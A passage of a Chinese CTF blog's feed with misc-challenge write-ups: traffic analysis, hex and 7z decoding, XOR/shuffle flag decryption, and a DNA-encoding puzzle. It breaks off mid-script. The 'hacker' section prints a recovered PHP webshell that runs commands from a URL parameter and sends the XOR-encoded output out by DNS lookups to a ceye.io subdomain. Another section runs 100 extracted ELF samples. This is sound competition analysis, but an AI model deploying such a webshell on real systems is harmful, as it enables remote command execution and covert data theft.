class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>                       <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &gt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>                           flag = -<span class="hljs-number">1</span><br>                   flags = <span class="hljs-number">2</span><br>                   func_key = code[<span class="hljs-number">0</span>]<br>                   class_key = func_dict[<span class="hljs-number">0</span>]<br>                   <span class="hljs-comment"># print(func_key, class_key)</span><br>                   <span class="hljs-comment"># print(func_key, class_key)</span><br>                   list_class.append(class_key)<br>                   <span class="hljs-comment"># print(list_class)</span><br>       <span class="hljs-keyword">else</span>:<br>           <span class="hljs-comment"># print(flag, flags)</span><br>           <span class="hljs-keyword">if</span> flag == -<span class="hljs-number">1</span>:<br>               flags = <span class="hljs-number">1</span><br>           <span class="hljs-keyword">if</span> flags == <span class="hljs-number">2</span>:<br>               flags = <span class="hljs-number">0</span><br>               <span class="hljs-keyword">continue</span><br>           <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> flags == <span class="hljs-number">0</span>:<br>               <span class="hljs-keyword">break</span><br>   <span class="hljs-comment"># 将完整利用链的类名，去除tree_，o改为0，按照顺序输出成字符串</span><br>   <span class="hljs-keyword">if</span> flag != -<span class="hljs-number">1</span>:<br>       <span class="hljs-keyword">for</span> cla <span class="hljs-keyword">in</span> list_class:<br>           <span class="hljs-built_in">print</span>(cla[<span class="hljs-number">5</span>:].replace(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>       <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>最终得到两条完整的利用链</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">7468652070617373776f7264206973203730383532613933613336343963613736653335626138353833376566613135<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">377aBCAf271c00041373e10830000000000000006A0000000000000057Acbd47A5c4CDB728a43AF6d91D92D25519Bac7876E97909B633223d3A1d7417A3a741ddAfB0E9A7F0b25C726085149ad1da4D40104060001093000070B0100022406F1070112530f9A96C63163E0Df042FD12EC0b32431902121010001000C2A2600080a017088A4910000050119010011130066006c00610067002e0074007800740000001900140a01008B43f758BE7Ad901150601002000000000000000<br></code></pre></td></tr></table></figure><p>转字符串后发现一个为<code>7z</code>文件，一个为<code>the password is 70852a93a3649ca76e35ba85837efa15</code>，解压得到flag</p><h2 id="hacker-traffic"><a href="#hacker-traffic" class="headerlink" title="hacker_traffic"></a>hacker_traffic</h2><p>在第4615条流中发现flag.zip</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-1.png"></p><p>注释内容：<code>password is (md5(virus_file) + lhost_ip)</code></p><p>同时发现流量中有很多elf文件，使用tshark或者python提取</p><p>这里使用binwalk，但是需要注意部分binwalk版本不能提取elf文件</p><p>需要修改<code>/usr/lib/python3/dist-packages/binwalk/config/extract.conf</code>文件(以kali默认位置为例)</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-2.png"></p><p>共提取出100个elf文件，且每个elf文件运行后都会打印一个md5值</p><p>使用tcpdump监听后运行所有elf文件<br><code>tcpdump -tttt -s0 -X -vv -w t.pcap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用find命令查找当前文件夹下所有的elf文件</span><br>elf_files=$(find . -maxdepth 1 -type f -executable -name &quot;*.elf&quot;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用循环依次执行每一个elf文件</span><br>for file in $elf_files<br>do<br>  echo &quot;Executing $file&quot;<br>  ./$file<br>done<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-3.png"></p><p>分析<code>t.pcap</code>文件，发现只有<code>22E7CF.elf</code>访问了<code>192.168.3.201</code>这个ip</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-4.png"></p><p>将文件md5和地址拼接后解压提示密码错误，是因为tcp传输文件会有冗余，需要计算elf文件的真正大小</p><p>readelf读文件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-5.png"></p><p>得到</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">Start of section headers:          14736 (bytes into file)<br>Size of section headers:           64 (bytes)<br>Number of section headers:         30<br></code></pre></td></tr></table></figure><p>参考文章：<a href="https://luomuxiaoxiao.com/?p=139">计算机原理系列之二 ——– 详解ELF文件</a></p><p>计算得到<code>14736+64*30=16656字节</code></p><p>16656即4110(16进制)，将冗余的数据去除</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-6.png"></p><p>计算真正的md5</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-7.png"></p><p>拼接起来，得到<code>0f82ecb23adc35a4a5e3d8bdabbafe15192.168.3.201</code></p><p>解压得到一个py脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> secret<br>key = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_flag</span>(<span class="hljs-params">flag, key</span>):<br>    random.seed(key)<br>    table = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">38</span>))<br>    random.shuffle(table)<br>    flag = [flag[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table]<br>    ascii_flag = [<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag]<br>    random.seed(key)<br>    xor_key = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>    encrypted_flag = [c ^ xor_key <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> ascii_flag]<br>    <span class="hljs-keyword">return</span> base64.b64encode(<span class="hljs-built_in">bytes</span>(encrypted_flag)).decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br><span class="hljs-built_in">print</span>(encrypt_flag(flag, key))<br><span class="hljs-comment"># VFVWU1kGBgIMUlMBVFcBBgRRBFAHVFBVUFkbUB0DAQMEBVIGAlE=</span><br></code></pre></td></tr></table></figure><p>伪随机+shuffle生成s盒进行的置换异或加密</p><p>根据<code>key=&quot;x.x.x.x&quot;</code>可知key就是ip地址，为<code>192.168.3.201</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag</span>(<span class="hljs-params">encrypted_flag, key</span>):<br>   random.seed(key)<br>   table = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">38</span>))<br>   random.shuffle(table)<br>   <span class="hljs-comment"># 解码base64编码的字符串</span><br>   encrypted_flag = base64.b64decode(encrypted_flag.encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br><br>   <span class="hljs-comment"># 随机生成一个密钥</span><br>   random.seed(key)<br>   xor_key = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br><br>   <span class="hljs-comment"># 对加密后的ASCII码列表进行异或运算</span><br>   decrypted_flag = [c ^ xor_key <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> encrypted_flag]<br><br>   <span class="hljs-comment"># 将异或后的ASCII码列表转换成字符列表</span><br>   flag = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> decrypted_flag])<br>   final_flag = [<span class="hljs-number">0</span>]*<span class="hljs-number">38</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(table)):<br>       final_flag[table[i]] = flag[i]<br><br>   <span class="hljs-comment"># 返回解密后的flag字符串</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(final_flag)<br><br>key = <span class="hljs-string">&quot;192.168.3.201&quot;</span><br>text = <span class="hljs-string">&#x27;VFVWU1kGBgIMUlMBVFcBBgRRBFAHVFBVUFkbUB0DAQMEBVIGAlE=&#x27;</span><br>flag = decrypt_flag(text, key)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;Query&quot;&gt;&lt;a href=&quot;#Query&quot; class=&quot;headerlink&quot; title=&quot;Query&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="2023" scheme="https://www.dr0n.top/tags/2023/"/>
    
    <category term="宁波" scheme="https://www.dr0n.top/tags/%E5%AE%81%E6%B3%A2/"/>
    
  </entry>
  
  <entry>
    <title>hw面试题</title>
    <link href="https://www.dr0n.top/posts/2109a2ab/"/>
    <id>https://www.dr0n.top/posts/2109a2ab/</id>
    <published>2023-05-15T05:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.910Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="54255f22429b4db3602c3a34c566cfc40a3b1912bb8cd0b8adefd1f366628b59"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="hw" scheme="https://www.dr0n.top/categories/hw/"/>
    
    
    <category term="hw" scheme="https://www.dr0n.top/tags/hw/"/>
    
    <category term="面试" scheme="https://www.dr0n.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>第三届&quot;红明谷&quot;杯网络安全大赛wp</title>
    <link href="https://www.dr0n.top/posts/86dd8190/"/>
    <id>https://www.dr0n.top/posts/86dd8190/</id>
    <published>2023-04-19T01:30:00.000Z</published>
    <updated>2024-02-29T08:47:27.934Z</updated>
    
    <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="阿尼亚"><a href="#阿尼亚" class="headerlink" title="阿尼亚"></a>阿尼亚</h2><p>文件尾有一串字符串<code>6333383363333963633338326333616263333865633261616332613363326261633262636333623263326235633261356332623563333834633262316333613063333832633361623061</code>，十六进制转字符串得到<code>c383c39cc382c3abc38ec2aac2a3c2bac2bcc3b2c2b5c2a5c2b5c384c2b1c3a0c382c3ab0a</code></p><p>C383明显是中文编码，转十六进制后爆破得到密码<code>简单的编码</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-1-1.png"></p><p>根据图片名字<code>netpixeljihad</code>，使用<code>PixelJihad</code>解密，密码是<code>简单的编码</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-1-2.png"></p><p>得到压缩包的密码<code>P@Ss_W0RD:)</code></p><p>解压得到<code>+-+-++--+- ++---+-++- -+--++-++- +--++-++-- --+++++--- ++-++---+- +++-+-+--- +-+-+---++ ---+++-++- -+--++-++- -+--+++-+- -+--++-++- -+--++-++- ++-+-+-+-- -+--+++-+- ++-++---+- -++++---+- -+--++-++- ++-+-+-+-- +-+++---+- +++-++---- ---+++-++- +-+-+---++ ++-+-+-+-- +-+-+--++- ++--+--++- -++++---+- +---+++-+- ++-+-+-+-- -++++---+- -+--+++-+- +--+-+-++- +++-+-+--- +-+++---+- -+--+-+++- -+--++-++- ---+++-++- ++++----+- -++++---+- -+--+++-+- -+--++-++- ----+++++-</code></p><p><a href="https://www.dcode.fr/code-decabit">在线解密</a>一把梭</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-1-3.png"></p><h2 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h2><p>流量分析，发现有个<code>shell.php</code>上传了一个<code>xxx1.php</code>，然后执行了<code>ls</code>和<code>cat secret.txt</code></p><p>格式化后如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$servername</span>=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-variable">$dbname</span>=<span class="hljs-string">&quot;zentao&quot;</span>;<br><span class="hljs-variable">$conn</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$servername</span>;dbname=<span class="hljs-subst">$dbname</span>&quot;</span>,<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>,PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);<br><span class="hljs-variable">$stmt</span>=<span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT password FROM zt_user WHERE account=\&#x27;admin\&#x27;&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><span class="hljs-variable">$result</span>=<span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>);<br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>;<br><span class="hljs-variable">$param</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-variable">$output</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$param</span>);<br><span class="hljs-variable">$hex_output</span>=<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$output</span>);<br><span class="hljs-variable">$hex_password</span>=<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$len_output</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_output</span>);<br><span class="hljs-variable">$len_password</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_password</span>);<br><span class="hljs-variable">$max_subdomain_length</span>=<span class="hljs-number">62</span>;<br><span class="hljs-variable">$subdomain_base</span>=<span class="hljs-string">&quot;yafgcy.ceye.io&quot;</span>;<br><span class="hljs-variable">$hex_xor</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len_output</span>;<span class="hljs-variable">$i</span>++) &#123;<br><span class="hljs-variable">$char_output</span>=<span class="hljs-variable">$hex_output</span>[<span class="hljs-variable">$i</span>];<br><span class="hljs-variable">$char_password</span>=<span class="hljs-variable">$hex_password</span>[<span class="hljs-variable">$i</span>%<span class="hljs-variable">$len_password</span>];<br><span class="hljs-variable">$char_xor</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$char_output</span>)^<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$char_password</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>.<span class="hljs-variable">$char_xor</span>)&gt;<span class="hljs-variable">$max_subdomain_length</span>) &#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>)%<span class="hljs-number">2</span>!=<span class="hljs-number">0</span>) &#123;<br><span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;0&quot;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$subdomain</span>);<br><span class="hljs-variable">$hex_xor</span>=<span class="hljs-string">&quot;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$hex_xor</span>.=<span class="hljs-variable">$char_xor</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>)%<span class="hljs-number">2</span>!=<span class="hljs-number">0</span>) &#123;<br><span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;0&quot;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$subdomain</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现是<code>dns</code>流量</p><p>提取出<code>secret.txt</code>，根据代码可知要与<code>admin</code>的密码进行异或</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">79227024716c7522787370254c777230667673222570247b76677322632671<br>d7b357226771575227a7372237677702573611f372570317b7672772076206<br>1479207024777b60247e6674231a626727666171372570317f766773207620<br>067879226731756c60206d75703670754e<br><br>password:8a3e684c923b763d252cf1e8734a7a29<br></code></pre></td></tr></table></figure><p>异或后发现是<code>DNA</code>编码，每62位会少内容，爆破就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python">mapping = &#123;<br><br><span class="hljs-string">&#x27;AAA&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>,<br><span class="hljs-string">&#x27;AAC&#x27;</span>:<span class="hljs-string">&#x27;b&#x27;</span>,<br><span class="hljs-string">&#x27;AAG&#x27;</span>:<span class="hljs-string">&#x27;c&#x27;</span>,<br><span class="hljs-string">&#x27;AAT&#x27;</span>:<span class="hljs-string">&#x27;d&#x27;</span>,<br><span class="hljs-string">&#x27;ACA&#x27;</span>:<span class="hljs-string">&#x27;e&#x27;</span>,<br><span class="hljs-string">&#x27;ACC&#x27;</span>:<span class="hljs-string">&#x27;f&#x27;</span>,<br><span class="hljs-string">&#x27;ACG&#x27;</span>:<span class="hljs-string">&#x27;g&#x27;</span>,<br><span class="hljs-string">&#x27;ACT&#x27;</span>:<span class="hljs-string">&#x27;h&#x27;</span>,<br><span class="hljs-string">&#x27;AGA&#x27;</span>:<span class="hljs-string">&#x27;i&#x27;</span>,<br><span class="hljs-string">&#x27;AGC&#x27;</span>:<span class="hljs-string">&#x27;j&#x27;</span>,<br><span class="hljs-string">&#x27;AGG&#x27;</span>:<span class="hljs-string">&#x27;k&#x27;</span>,<br><span class="hljs-string">&#x27;AGT&#x27;</span>:<span class="hljs-string">&#x27;l&#x27;</span>,<br><span class="hljs-string">&#x27;ATA&#x27;</span>:<span class="hljs-string">&#x27;m&#x27;</span>,<br><span class="hljs-string">&#x27;ATC&#x27;</span>:<span class="hljs-string">&#x27;n&#x27;</span>,<br><span class="hljs-string">&#x27;ATG&#x27;</span>:<span class="hljs-string">&#x27;o&#x27;</span>,<br><span class="hljs-string">&#x27;ATT&#x27;</span>:<span class="hljs-string">&#x27;p&#x27;</span>,<br><span class="hljs-string">&#x27;CAA&#x27;</span>:<span class="hljs-string">&#x27;q&#x27;</span>,<br><span class="hljs-string">&#x27;CAC&#x27;</span>:<span class="hljs-string">&#x27;r&#x27;</span>,<br><span class="hljs-string">&#x27;CAG&#x27;</span>:<span class="hljs-string">&#x27;s&#x27;</span>,<br><span class="hljs-string">&#x27;CAT&#x27;</span>:<span class="hljs-string">&#x27;t&#x27;</span>,<br><span class="hljs-string">&#x27;CCA&#x27;</span>:<span class="hljs-string">&#x27;u&#x27;</span>,<br><span class="hljs-string">&#x27;CCC&#x27;</span>:<span class="hljs-string">&#x27;v&#x27;</span>,<br><span class="hljs-string">&#x27;CCG&#x27;</span>:<span class="hljs-string">&#x27;w&#x27;</span>,<br><span class="hljs-string">&#x27;CCT&#x27;</span>:<span class="hljs-string">&#x27;x&#x27;</span>,<br><span class="hljs-string">&#x27;CGA&#x27;</span>:<span class="hljs-string">&#x27;y&#x27;</span>,<br><span class="hljs-string">&#x27;CGC&#x27;</span>:<span class="hljs-string">&#x27;z&#x27;</span>,<br><span class="hljs-string">&#x27;CGG&#x27;</span>:<span class="hljs-string">&#x27;A&#x27;</span>,<br><span class="hljs-string">&#x27;CGT&#x27;</span>:<span class="hljs-string">&#x27;B&#x27;</span>,<br><span class="hljs-string">&#x27;CTA&#x27;</span>:<span class="hljs-string">&#x27;C&#x27;</span>,<br><span class="hljs-string">&#x27;CTC&#x27;</span>:<span class="hljs-string">&#x27;D&#x27;</span>,<br><span class="hljs-string">&#x27;CTG&#x27;</span>:<span class="hljs-string">&#x27;E&#x27;</span>,<br><span class="hljs-string">&#x27;CTT&#x27;</span>:<span class="hljs-string">&#x27;F&#x27;</span>,<br><span class="hljs-string">&#x27;GAA&#x27;</span>:<span class="hljs-string">&#x27;G&#x27;</span>,<br><span class="hljs-string">&#x27;GAC&#x27;</span>:<span class="hljs-string">&#x27;H&#x27;</span>,<br><span class="hljs-string">&#x27;GAG&#x27;</span>:<span class="hljs-string">&#x27;I&#x27;</span>,<br><span class="hljs-string">&#x27;GAT&#x27;</span>:<span class="hljs-string">&#x27;J&#x27;</span>,<br><span class="hljs-string">&#x27;GCA&#x27;</span>:<span class="hljs-string">&#x27;K&#x27;</span>,<br><span class="hljs-string">&#x27;GCC&#x27;</span>:<span class="hljs-string">&#x27;L&#x27;</span>,<br><span class="hljs-string">&#x27;GCG&#x27;</span>:<span class="hljs-string">&#x27;M&#x27;</span>,<br><span class="hljs-string">&#x27;GCT&#x27;</span>:<span class="hljs-string">&#x27;N&#x27;</span>,<br><span class="hljs-string">&#x27;GGA&#x27;</span>:<span class="hljs-string">&#x27;O&#x27;</span>,<br><span class="hljs-string">&#x27;GGC&#x27;</span>:<span class="hljs-string">&#x27;P&#x27;</span>,<br><span class="hljs-string">&#x27;GGG&#x27;</span>:<span class="hljs-string">&#x27;Q&#x27;</span>,<br><span class="hljs-string">&#x27;GGT&#x27;</span>:<span class="hljs-string">&#x27;R&#x27;</span>,<br><span class="hljs-string">&#x27;GTA&#x27;</span>:<span class="hljs-string">&#x27;S&#x27;</span>,<br><span class="hljs-string">&#x27;GTC&#x27;</span>:<span class="hljs-string">&#x27;T&#x27;</span>,<br><span class="hljs-string">&#x27;GTG&#x27;</span>:<span class="hljs-string">&#x27;U&#x27;</span>,<br><span class="hljs-string">&#x27;GTT&#x27;</span>:<span 